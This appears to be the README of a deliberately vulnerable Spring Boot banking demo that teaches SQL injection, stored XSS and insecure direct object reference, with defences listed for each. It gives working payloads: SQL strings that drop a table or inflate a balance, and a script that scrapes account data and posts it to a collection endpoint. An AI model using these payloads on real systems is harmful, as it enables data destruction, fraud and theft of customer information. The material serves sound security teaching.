# Common Security Vulnerability Demo

The purpose of this application is to illustrate a few common security vulnerabilities in web applications. Understanding how these exploits work is critical in being able to defend against them. 

## Application Setup

This application runs in two different modes: 
* Secure - proper protections and being used to mitigate the attacks
* Insecure - the application is exposed to attacks

To run it in either mode, use the spring profile field when starting the app as follows:

Insecure

`mvn spring-boot:run -Dspring.profiles.active=insecure`
Use a browser to access `http://localhost:8080`

Secure

`mvn spring-boot:run -Dspring.profiles.active=secure`
User a browser to access `http://localhost:8081`

In secure mode, you also have the option to enable or disable input validation using the following flag in `application-secure.properties`

`input.validation.enabled=false`

Disabling input validation will allow you to illustrate the power of an ORM and output encoding in protecting against attacks even when input validation does not occur.

Currently, the application illustrates the following vulnerabilities
* SQL Injection
* Stored Cross-site scripting (XSS)
* Insecure Direct Object Reference

## SQL Injection

To exploit this vulnerability, log in as a customer and inject SQL into the first name field as follows

`'; SQL Here; --`

For example:

`' DROP TABLE customer; --`

`' UPDATE bank_account SET balance=999999999 WHERE customer_id=2; --`

You may view the database by logging into the H2 console by clicking the link from the index page. The connection details are found in the application.properties file.

Defending against this vulnerability can be done at multiple levels
* ORM
* Input validation
* Database permissions restrictions

## Cross-Site Scripting

To exploit this vulnerability, log in as a customer and inject the following javascript into the first name field as follows

`<script type="text/javascript">$(document).ready(function(){var accountInfo="";$("table").children("tbody").children("tr").each(function(){$(this).children("td").each(function(){accountInfo=accountInfo+";"+$(this).text();});});$.post("http://localhost:8080/receive-hack", {accountInfo:accountInfo});});alert("hacked");</script>`

This attack will allow a malicious user to inject a script into the database that then will run on the employee level and expose customer details to another endpoint controlled by the malicious user. In this case, it is simply the same app server, but this would be different in a real attack.

Defending against this vulnerability can be done at multiple levels
* Validating user input 
* Encoding dynamic output on web pages

## Insecure Direct Object Reference

To exploit this vulnerability, log in as a customer and type in the following url which will allow you to access sensitive employee-only information directly.

`/sensitive`

This attack allows users to access information that they should not be authorized to access. 

Defending against this vulnerability can be done through multiple authorization mechanisms
* URL-level protection
* Method-level security with role-based access configuration
* Method pre-authorization configuration

